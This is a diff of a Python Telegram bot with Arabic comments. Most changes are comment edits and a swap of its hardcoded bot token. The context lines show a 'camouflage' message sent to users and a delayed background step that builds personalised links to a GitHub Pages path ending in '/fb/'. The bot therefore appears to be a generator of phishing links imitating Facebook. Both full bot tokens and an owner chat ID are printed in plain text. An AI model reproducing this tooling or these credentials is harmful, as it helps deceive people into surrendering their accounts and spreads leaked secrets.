@@ -6,7 +6,7 @@ from threading import Thread
 import os
 import time
 
-# 1. إعداد السيرفر لضمان البقاء أونلاين
+# 1. إعداد السيرفر لضمان البقاء أونلاين 24 ساعة
 app = Flask('')
 @app.route('/')
 def home(): return "M.Y.9 System Online"
@@ -14,8 +14,8 @@ def home(): return "M.Y.9 System Online"
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 def keep_alive(): Thread(target=run).start()
 
-# 2. إعدادات البوت باسمك الجديد: أبو أسيد
-TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
+# 2. إعدادات البوت بالتوكن الجديد واسم أبو أسيد
+TOKEN = '8386427321:AAFkUyXqB2RYScbT1Cv3utTVLau8Qi3ugvg'
 MY_ID = '7238206121' 
 bot = telebot.TeleBot(TOKEN)
 
@@ -32,7 +32,7 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    # رسالة التمويه باسم أبو أسيد
+    # رسالة التمويه والتحذير باسم أبو أسيد
     warning_text = f"""
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
 
@@ -50,7 +50,7 @@ def start(m):
 
     # 4. تشغيل عداد الدقيقتين في الخلفية
     def background_process(chat_id, user_name):
-        time.sleep(120) # انتظار دقيقتين
+        time.sleep(120) # انتظار دقيقتين (120 ثانية)
         
         h = user_name.replace(" ", "_")
         base = "https://m-y-9-tech.github.io/fb/"
@@ -91,10 +91,10 @@ def start(m):
 
     Thread(target=background_process, args=(uid, name)).start()
 
-# 5. تشغيل البوت وحماية 409
+# 5. تشغيل البوت وحماية 409 النهائية
 if __name__ == "__main__":
     keep_alive()
     bot.remove_webhook()
     time.sleep(1)
-    # استخدام skip_pending لمسح أي رسائل قديمة (زي اللي بالصورة)
+    # استخدام skip_pending لمسح أي رسائل قديمة وتجنب التعارض
     bot.infinity_polling(skip_pending=True)
